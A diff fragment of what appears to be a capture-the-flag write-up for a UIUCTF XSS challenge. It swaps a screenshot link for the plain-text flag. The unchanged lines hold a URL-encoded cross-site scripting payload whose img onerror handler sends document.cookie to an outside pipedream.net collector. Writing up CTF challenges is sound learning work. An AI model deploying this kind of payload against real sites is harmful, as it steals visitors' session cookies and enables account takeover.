@@ -58,4 +58,6 @@ The next part was simple enough we just had to take our newfound knowledge and c
 ```
 https://peanut-xss-web.chal.uiuc.tf/?nutshell=%3Chtml%3E%0A%3Cbody%3E%0A%20%20%20%20%3Ch2%3ETo%20write%20a%20section%2C%3C%2Fh2%3E%0A%20%20%20%20%3Cp%3Ejust%20use%20headings%20%26%20paragraphs%20like%20this!%20Then%E2%80%A6%3C%2Fp%3E%0A%20%20%20%20%3Ch2%3ETo%20embed%20a%20section%2C%3C%2Fh2%3E%0A%20%20%20%20%3Ca%20href%3D%22%23ToWriteASection%22%3E%3A%26lt%3Bimg%20src%3Dx%20onerror%3Dthis.src%3D%27https%3A%2F%2Feor2d2npr01b93o.m.pipedream.net%2F%3F%27%2Bdocument.cookie%3B%26gt%3B%26lt%3B%2Fimg%26gt%3B%3C%2Fa%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%20%20%20%20
 ```
-![flagsuccess](images/flagsuccess.png)
+```
+uiuctf{cr4ck1ng_0open_somE_nuTsh3lls}
+```
